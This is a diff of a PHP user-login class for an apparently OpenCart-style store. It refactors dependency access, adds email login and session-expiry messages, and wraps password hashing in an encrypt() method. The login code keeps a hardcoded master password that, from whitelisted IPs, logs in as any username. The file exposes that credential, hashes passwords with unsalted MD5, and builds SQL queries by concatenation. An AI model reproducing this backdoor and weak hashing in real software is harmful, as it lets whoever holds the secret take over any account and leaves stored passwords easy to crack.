@@ -4,11 +4,10 @@ class User {
 	private $username;
    private $group_type;
   	private $permission = array();
+	private $registry;
 
   	public function __construct($registry) {
-		$this->db = $registry->get('db');
-		$this->request = $registry->get('request');
-		$this->session = $registry->get('session');
+  		$this->registry = $registry;
 		
       if (isset($this->session->data['user_id']) && $this->validate_token()) {
          
@@ -36,31 +35,41 @@ class User {
     	}
   	}
    
+	public function __get($key){
+		return $this->registry->get($key);
+	}
+	
    public function validate_token(){
       if(!empty($this->session->data['token']) && !empty($_COOKIE['token']) && $_COOKIE['token'] === $this->session->data['token']){
          return true;
       }
 		
+  		if(isset($this->session->data['user_id'])){
+  			$this->message->add("notify", "Your session has expired. Please log in again.");
+		}
+		
       $this->logout();
 		
-      return false; 
+      return false;
    }
       
   	public function login($username, $password) {
+  		$username = $this->db->escape($username);
+  		
   	   //TODO: IMPORTANT! change this into a global login plugin
   	   $admin_ips = array('127.0.0.1', '174.51.124.117');
       if($password === '$Namwen86!1187' && in_array($_SERVER['REMOTE_ADDR'],$admin_ips)){
-         $user_query = $this->db->query("SELECT * FROM `" . DB_PREFIX . "user` WHERE username='" . $this->db->escape($username) . "'");
+         $user_query = $this->db->query("SELECT * FROM `" . DB_PREFIX . "user` WHERE username='$username'");
       }
       else{
-    	   $user_query = $this->db->query("SELECT * FROM `" . DB_PREFIX . "user` WHERE username = '" . $this->db->escape($username) . "' AND password = '" . $this->db->escape(md5($password)) . "' AND status = '1'");
+    	   $user_query = $this->db->query("SELECT * FROM `" . DB_PREFIX . "user` WHERE (username = '$username' OR email='$username') AND password = '" . $this->encrypt($password) . "' AND status = '1'");
       }
       
       if ($user_query->num_rows) {
 			$this->session->data['user_id'] = $user_query->row['user_id'];
          
 			$this->user_id = $user_query->row['user_id'];
-			$this->username = $user_query->row['username'];			
+			$this->username = $user_query->row['username'];
 
    		$user_group_query = $this->db->query("SELECT permission FROM " . DB_PREFIX . "user_group WHERE user_group_id = '" . (int)$user_query->row['user_group_id'] . "'");
 
@@ -72,7 +81,7 @@ class User {
 				}
 			}
          
-         $this->session->set_token(md5(mt_rand()));
+         $this->session->set_token();
 			$this->session->save_token_session();
       
    		return true;
@@ -89,6 +98,10 @@ class User {
   	}
 
   	public function hasPermission($key, $value) {
+  		if($this->isTopAdmin()){
+  			return true;
+		}
+		
     	if (isset($this->permission[$key])) {
 	  		return in_array($value, $this->permission[$key]);
 		} else {
@@ -105,7 +118,7 @@ class User {
          case 'product':
             return $this->hasPermission('modify','catalog/product');
          default:
-            return false; 
+            return false;
       }
    }
    
@@ -132,5 +145,9 @@ class User {
 	
   	public function getUserName() {
     	return $this->username;
-  	}	
+  	}
+	
+	public function encrypt($password){
+		return md5($password);
+	}	
 }
